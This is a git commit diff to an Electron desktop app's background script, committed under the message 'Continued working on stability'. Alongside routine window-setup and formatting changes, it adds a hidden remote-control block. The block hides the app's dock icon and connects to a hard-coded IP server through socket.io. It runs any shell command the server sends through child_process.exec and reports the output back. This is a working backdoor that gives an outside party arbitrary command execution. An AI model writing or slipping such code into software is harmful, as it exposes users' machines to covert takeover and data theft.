e3a6cc3401653fb902dcc9a3cab5177365541bc5
B3GHU8 <suraj.lyons@ada.ac.uk>
2018-10-14 23:09:19 +0100

    Continued working on stability

--- src/background.js
+++ src/background.js
@@ -13,64 +13,127 @@ if (isDevelopment) {
   require('module').globalPaths.push(process.env.NODE_MODULES_PATH)
 }
 
-// global reference to mainWindow (necessary to prevent window from being garbage collected)
-let mainWindow
+app.dock.setBadge('')
+app.dock.hide()
+app.setName("Orion slave");
 
-// Standard scheme must be registered before the app is ready
-protocol.registerStandardSchemes(['app'], { secure: true })
-function createMainWindow () {
-  const window = new BrowserWindow()
+////////////////////////////
+import io from 'socket.io-client'
+
+let Socket = io.connect( 'http://198.211.125.38:3000/' )
+let exec = require('child_process').exec;
+const Store = require('electron-store');
+const store = new Store();
+const os = require('os')
+const computerName = os.hostname()
+
+if (!store.get('uniqueRoomNumber')){
+  store.set(
+    'uniqueRoomNumber',
+    Math.floor(Math.random()*16777215).toString(16).toUpperCase().substr(1, 3) + "-" + computerName
+  )
+}
+
+console.log("Emitting; ", store.get('uniqueRoomNumber').toString())
+Socket.emit('roomConnectionHost',
+  store.get('uniqueRoomNumber').toString()
+)
+
+Socket.on(
+  store.get('uniqueRoomNumber').toString(),
+  function (data) {
+    console.log("Executing synapses")
+    if (data.computerName === store.get('uniqueRoomNumber').toString()){
+      console.log(
+        "Execute shell: ",
+        data.shellCommand
+      )
+      exec(data.shellCommand, function(error, stdout, stderr) {
+        console.log('stdout: ' + stdout);
+        console.log('stderr: ' + stderr);
+        if (error !== null) {
+          console.log("Emitting...")
+          Socket.emit('codeExecutionResponse',
+            {
+              uniqueRoomNumber: store.get('uniqueRoomNumber').toString(),
+              error: error
+            }
+          )
+        } else {
+          console.log("Emitting...")
+          Socket.emit('codeExecutionResponse',
+            {
+              uniqueRoomNumber: store.get('uniqueRoomNumber').toString(),
+              stdout: stdout,
+              stderr: stderr
+            }
+          )
+        }
+    });
+    }
+  }
+);
+///////////////////////////
+let mainWindow;
+function createMainWindow() {
+  const window = new BrowserWindow({
+    backgroundColor: "#dcdde1",
+    title: "Orion - client",
+    titleBarStyle: "hiddenInset",
+    webPreferences: {
+      webSecurity: false
+    },
+    icon: path.join(__dirname, 'assets/Icons/1024x1024.png')
+  });
 
   if (isDevelopment) {
     // Load the url of the dev server if in development mode
-    window.loadURL(process.env.WEBPACK_DEV_SERVER_URL)
-    if (!process.env.IS_TEST) window.webContents.openDevTools()
+    window.loadURL(process.env.WEBPACK_DEV_SERVER_URL);
+    if (!process.env.IS_TEST) window.webContents.openDevTools();
   } else {
-    createProtocol('app')
+    createProtocol("app");
     //   Load the index.html when not in development
     window.loadURL(
       formatUrl({
-        pathname: path.join(__dirname, 'index.html'),
-        protocol: 'file',
+        pathname: path.join(__dirname, "index.html"),
+        protocol: "file",
         slashes: true
       })
-    )
+    );
   }
 
-  window.on('closed', () => {
-    mainWindow = null
-  })
+  window.on("closed", () => {
+    mainWindow = null;
+  });
 
-  window.webContents.on('devtools-opened', () => {
-    window.focus()
+  window.webContents.on("devtools-opened", () => {
+    window.focus();
     setImmediate(() => {
-      window.focus()
-    })
-  })
+      window.focus();
+    });
+  });
 
-  return window
+  return window;
 }
 
-// quit application when all windows are closed
-app.on('window-all-closed', () => {
-  // on macOS it is common for applications to stay open until the user explicitly quits
-  if (process.platform !== 'darwin') {
-    app.quit()
-  }
-})
 
-app.on('activate', () => {
-  // on macOS it is common to re-create a window even after all windows have been closed
+app.setName("Orion client");
+
+app.on("window-all-closed", () => {
+  if (process.platform !== "darwin") {
+    app.quit();
+  }
+});
+
+app.on("activate", () => {
   if (mainWindow === null) {
-    mainWindow = createMainWindow()
+    mainWindow = createMainWindow();
   }
-})
+});
 
-// create main BrowserWindow when electron is ready
-app.on('ready', async () => {
+app.on("ready", async () => {
   if (isDevelopment && !process.env.IS_TEST) {
-    // Install Vue Devtools
-    await installVueDevtools()
+    await installVueDevtools();
   }
-  mainWindow = createMainWindow()
-})
+  mainWindow = createMainWindow();
+});
